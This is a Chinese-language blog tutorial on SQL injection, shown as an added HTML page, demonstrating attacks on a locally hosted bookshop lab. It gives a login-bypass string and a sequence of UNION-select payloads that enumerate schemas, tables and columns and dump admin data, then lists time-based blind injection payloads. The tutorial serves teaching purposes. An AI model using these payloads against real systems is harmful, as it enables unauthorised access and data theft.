@@ -1,0 +1,80 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="John Doe"><link rel="alternative" href="/atom.xml" title="木肃的博客" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>SQL注入 - 木肃的博客</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">木肃的博客</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-12-30T11:55:31.000Z">十二月 30, 2018</time><h1 class="post__title"><a href="/2018/12/30/SQL注入/">SQL注入</a></h1><div class="post__main echo"><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>当Web应用向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库进行执行，获取或修改数据库中的数据。</p>
+<h3 id="SQL注入漏洞有两个关键条件："><a href="#SQL注入漏洞有两个关键条件：" class="headerlink" title="SQL注入漏洞有两个关键条件："></a>SQL注入漏洞有两个关键条件：</h3><ul>
+<li>用户能控制输入的内容</li>
+<li>web应用把用户输入的内容带入到数据库中执行</li>
+</ul>
+<h3 id="接下来将用自己本地搭建的环境来演示SQL注入"><a href="#接下来将用自己本地搭建的环境来演示SQL注入" class="headerlink" title="接下来将用自己本地搭建的环境来演示SQL注入"></a>接下来将用自己本地搭建的环境来演示SQL注入</h3><h3 id="一、万能密码"><a href="#一、万能密码" class="headerlink" title="一、万能密码"></a>一、万能密码</h3><p>打开网站的登陆界面，我们没有密码是无法登陆的但是由于网站开发者在开发网站时没有对登陆进行过滤，导致存在万能密码漏洞</p>
+<p><img src="/SQL注入/图片1.png" alt=""></p>
+<p>输入万能密码 root ‘ or 1 = 1# </p>
+<p><img src="/SQL注入/图片2.png" alt=""></p>
+<p>点击登陆，就会提示我们登陆成功！</p>
+<p><img src="/SQL注入/图片3.png" alt=""></p>
+<p>看，我们已经登陆进来了！</p>
+<p><img src="/SQL注入/图片4.png" alt=""></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>登陆语句是这样的：</p>
+<p>SELECT * FROM admin WHERE Username=’root’ and Password =’pass’</p>
+<p>查询admi表里所有Username =我们输入的Username 并且Password =我们输入的Password的结果</p>
+<p>只要结果不为空就为真，也就是登陆成功</p>
+<p>我们输入万能密码root ‘ or 1 = 1# 构造</p>
+<p>SELECT * FROM admin WHERE Username=’root ‘ or 1 = 1#’and Password =’pass’ </p>
+<p>通过注释符号#注释掉and Password =’pass，在root’ or 1=1 的基础上使结果为真成立。</p>
+<h2 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h3><p>SQL注入，从代码角度来看：</p>
+<p>分为数字型和字符型，又根据字符型和数字型可以外加（）和字符型能使用双引号和单引号</p>
+<p>分为以下几种：</p>
+<p>1、selent * from users where id=1纯数字</p>
+<p>2、selent * from users where id=’1’只加单引号</p>
+<p>3、selent * from users where id=”1”只加双引号</p>
+<p>4、selent * from users where (id=1)数字加括号</p>
+<p>5、selent * from users where (id=’1’)数字加单引号</p>
+<p>6、selent * from users where (id=”1”)数字加双引号</p>
+<p>如果写的不够清晰，我们可以用一张图来解释</p>
+<p><img src="/SQL注入/图片5.png" alt=""></p>
+<h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>打开搭建好的环境，点击打开一个页面来测试有没有SQL注入</p>
+<p><img src="/SQL注入/图片6.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’   出现问题，可能存在注入</p>
+<p><img src="/SQL注入/图片7.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’ %23  加%23后恢复正常，可以判断为’1’注入</p>
+<p> <img src="/SQL注入/图片8.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’ order by 1 %23   使用order by 1   2   3   4  进行测试，发现查询的结果为12列，再这里我只显示结尾截图，方便后续使用union select</p>
+<p> <img src="/SQL注入/图片9.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’ union select 1,2,3,4,5,6,7,8,9,10,11,12 %23     发现页面不显示union select的内容，尝试使用limit或者是将前边的内容改为空</p>
+<p> <img src="/SQL注入/图片10.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’ union select 1,2,3 limit 1,1 %23</p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=55’ union select 1,2,3 %23     可以显示union select后的内容，8是显示结果的地方</p>
+<p> <img src="/SQL注入/图片11.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=-55’union select 1,2,3,4,5,6,7,user(),9,10,11,12 %23    把8位改为user()和database()发现可以显示用户和数据库</p>
+<p> <img src="/SQL注入/图片12.png" alt=""></p>
+<p><img src="/SQL注入/图片13.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=-55’union select 1,2,3,4,5,6,7,(select group_concat(schema_name) from information_schema.SCHEMATA),9,10,11,12 %23</p>
+<p> 查询所有的库名字</p>
+<p> <img src="/SQL注入/图片14.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=-55’union select 1,2,3,4,5,6,7,(select group_concat(table_name) from information_schema.TABLES where table_schema = ‘test’),9,10,11,12 %23     </p>
+<p> 查询出test库中所有的表名</p>
+<p> <img src="/SQL注入/图片15.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=-55’union select 1,2,3,4,5,6,7,(select group_concat(column_name) from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘admin’),9,10,11,12 %23       查询处test库中admin表所有的字段名字</p>
+<p> <img src="/SQL注入/图片16.png" alt=""></p>
+<p><a href="http://127.0.0.1/bookshop/show_pro.php" target="_blank" rel="noopener">http://127.0.0.1/bookshop/show_pro.php</a></p>
+<p>?id=-55’union select 1,2,3,4,5,6,7,(select group_concat(news) from test.admin ),9,10,11,12 %23</p>
+<p>查询security库中users表中的数据,由于这个表中没有数据所以不会有显示，但在真实环境中是会看到内容的</p>
+<p><img src="/SQL注入/图片17.png" alt=""></p>
+<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>延时盲注会有以下几种情况，暂不做演示</p>
+<p>1’ and sleep(5) %23</p>
+<p>1’) and sleep(5) %23</p>
+<p>1’)) and sleep(5) %23</p>
+<p>1 and sleep(5) %23</p>
+<p>1) and sleep(5) %23</p>
+<p>1)) and sleep(5) %23</p>
+<p>1” and sleep(5) %23</p>
+<p>1”) and sleep(5) %23</p>
+<p>1”)) and sleep(5) %23</p>
+</div></header></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2018 John Doe</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>
